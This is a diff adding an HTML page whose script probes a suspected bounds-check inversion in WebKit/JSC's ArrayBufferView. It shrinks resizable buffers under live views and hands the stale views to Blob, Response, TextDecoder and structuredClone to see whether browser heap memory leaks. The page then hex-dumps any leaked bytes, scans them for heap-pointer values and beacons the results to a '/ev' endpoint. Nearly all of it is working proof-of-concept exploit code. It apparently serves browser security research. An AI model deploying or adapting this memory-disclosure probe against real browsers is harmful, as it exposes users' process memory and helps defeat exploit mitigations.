@@ -1,0 +1,77 @@
+<!doctype html><html><head><meta charset="utf-8"><title>oobview</title>
+<script>
+'use strict';
+/* docs/95 part 9: JSC::ArrayBufferView (the C++ wrapper WebCore consumes) computes
+   byteOffset()/byteLength() for resizable buffers with
+       if (UNLIKELY(!(byteOffsetStart > bufferByteLength || byteOffsetEnd > bufferByteLength))) return 0;
+   i.e. it returns 0 when the view is IN bounds and the raw length when it is OUT of bounds —
+   the opposite of the JSC-side clamp. If that is live, a view over a buffer that was shrunk
+   after the view was made hands WebCore a stale length + the old base address, and any
+   BufferSource consumer (Blob, Response, TextDecoder, structuredClone) copies heap bytes to JS.
+   Every probe reports the JS-visible byteLength next to what the consumer received. */
+var Q=[],PUMPING=false,SENT=0;
+function send(e){ return new Promise(function(res){ var im=new Image(),d=false;
+  function fin(){ if(d)return; d=true; res(); } im.onload=fin; im.onerror=fin;
+  im.src='/ev?m='+encodeURIComponent(e); setTimeout(fin,250); }); }
+function pump(){ if(PUMPING)return; PUMPING=true; (async function(){ while(Q.length){ await send(Q.shift()); SENT++; } PUMPING=false; })(); }
+function add(k,v){ Q.push(k+'='+String(v).replace(/[\t\r\n]+/g,' ').slice(0,240)); pump(); }
+function T(k,fn){ try{ var r=fn(); if(r&&r.then){ r.then(function(v){add(k,v);},function(e){add(k,'REJ '+e.name+': '+e.message);}); } else add(k,r); }catch(e){ add(k,'THROW '+e.name+': '+e.message); } }
+window.onerror=function(m,s,l,c){ add('ONERROR',m+' @'+l); return false; };
+new Image().src='/ev?m=BOOT+oobview';
+
+function hex(u,n){ var h='',i; for(i=0;i<Math.min(n||32,u.length);i++) h+=(u[i]<16?'0':'')+u[i].toString(16); return h; }
+function ptrscan(b){
+  var hits=[],i,j;
+  for(j=0;j<8;j++) for(i=j;i+8<=b.length;i+=8){
+    if(b[i+6]===0 && b[i+7]===0 && b[i+5]>=0x60 && b[i+5]<=0x7f && (b[i]|b[i+1]|b[i+2]|b[i+3]|b[i+4])!==0){
+      var hx=''; for(var k=7;k>=0;k--) hx+=(b[i+k]<16?'0':'')+b[i+k].toString(16);
+      hits.push('@'+i+'=0x'+hx);
+    }
+  }
+  return 'ptr='+hits.length+(hits.length?('['+hits.slice(0,4).join(',')+']'):'');
+}
+function fill(n,seed){ var ab=new ArrayBuffer(n,{maxByteLength:n}), v=new Uint8Array(ab), i;
+  for(i=0;i<n;i++) v[i]=(i*7+(seed||0))&0xff; return {ab:ab,v:v}; }
+
+add('feat', 'resize='+typeof ArrayBuffer.prototype.resize+' transfer='+typeof ArrayBuffer.prototype.transfer+' slice='+typeof ArrayBuffer.prototype.slice);
+
+/* A. in-bounds view over a resizable buffer: the inversion predicts byteLength()==0 here */
+T('a_blob', function(){ var o=fill(64,1); return 'jsBL='+o.v.byteLength+' blob='+new Blob([o.v]).size+' td='+new TextDecoder().decode(o.v).length; });
+T('a_resp', function(){ var o=fill(64,2); return new Response(o.v).arrayBuffer().then(function(b){ return 'jsBL='+o.v.byteLength+' resp='+b.byteLength; }); });
+T('a_copy', function(){ var o=fill(64,3); var c=new Uint8Array(o.v); return 'jsBL='+o.v.byteLength+' copy='+c.length+' b0='+c[0]; });
+T('a_clone', function(){ var o=fill(64,4); var c=structuredClone(o.v); return 'jsBL='+o.v.byteLength+' clone='+c.byteLength; });
+
+/* B. the same view after the buffer shrinks: the inversion predicts raw length + old base */
+T('b0_blob', function(){ var o=fill(1024,5); o.ab.resize(0); return 'jsBL='+o.v.byteLength+' blob='+new Blob([o.v]).size+' td='+new TextDecoder().decode(o.v).length; });
+T('b0_resp', function(){ var o=fill(1024,6); o.ab.resize(0); return new Response(o.v).arrayBuffer().then(function(b){ return 'jsBL='+o.v.byteLength+' resp='+b.byteLength; }); });
+T('b0_copy', function(){ var o=fill(1024,7); o.ab.resize(0); var c=new Uint8Array(o.v); return 'jsBL='+o.v.byteLength+' copy='+c.length; });
+T('b0_clone', function(){ var o=fill(1024,8); o.ab.resize(0); var c=structuredClone(o.v); return 'jsBL='+o.v.byteLength+' clone='+c.byteLength; });
+T('b8_blob', function(){ var o=fill(1024,9); o.ab.resize(8); return 'jsBL='+o.v.byteLength+' blob='+new Blob([o.v]).size; });
+T('b512_blob', function(){ var o=fill(1024,10); o.ab.resize(512); return 'jsBL='+o.v.byteLength+' blob='+new Blob([o.v]).size; });
+T('b0_dv', function(){ var o=fill(1024,11); var dv=new DataView(o.ab); o.ab.resize(0); var r='jsBL='+dv.byteLength; try { dv.getUint8(0); r+=' get8=ok'; } catch(e){ r+=' get8='+e.name; } return r; });
+T('b0_sub', function(){ var o=fill(1024,12); var s=o.v.subarray(100,200); o.ab.resize(0); return 'jsBL='+s.byteLength+' copy='+new Uint8Array(s).length; });
+
+/* C. controls: detached (not shrunk) buffer, and a non-resizable buffer */
+T('c_det', function(){ var ab=new ArrayBuffer(1024), v=new Uint8Array(ab); ab.transfer ? ab.transfer() : 0; return 'jsBL='+v.byteLength+' blob='+new Blob([v]).size; });
+
+/* D. if any consumer reports a non-zero size for a 0-length view, dump the bytes it got */
+async function dump(){
+  var o=fill(1024,13); o.ab.resize(0);
+  try{
+    var b=new Blob([o.v]); var got=new Uint8Array(await b.arrayBuffer());
+    add('d_blob_bytes', 'size='+got.length+' '+hex(got,32)+' nz='+got.filter(function(x){return x;}).length+' '+ptrscan(got));
+  }catch(e){ add('d_blob_bytes','FAIL '+e.name+': '+e.message); }
+  try{
+    var r=await new Response(o.v).arrayBuffer(); var g2=new Uint8Array(r);
+    add('d_resp_bytes','size='+g2.length+' '+hex(g2,32)+' '+ptrscan(g2));
+  }catch(e){ add('d_resp_bytes','FAIL '+e.name+': '+e.message); }
+  try{
+    var s=new TextDecoder().decode(o.v);
+    add('d_td_str','len='+s.length+' head='+s.slice(0,24).replace(/[\x00-\x1f]/g,'.'));
+  }catch(e){ add('d_td_str','FAIL '+e.name+': '+e.message); }
+  add('DONE','sent='+SENT);
+  await new Promise(function(r){ setTimeout(r,300); });
+  document.title='DONE';
+}
+(async function(){ while(Q.length||PUMPING) await new Promise(function(r){ setTimeout(r,40); }); await dump(); })();
+</script></head><body><p>oobview</p></body></html>
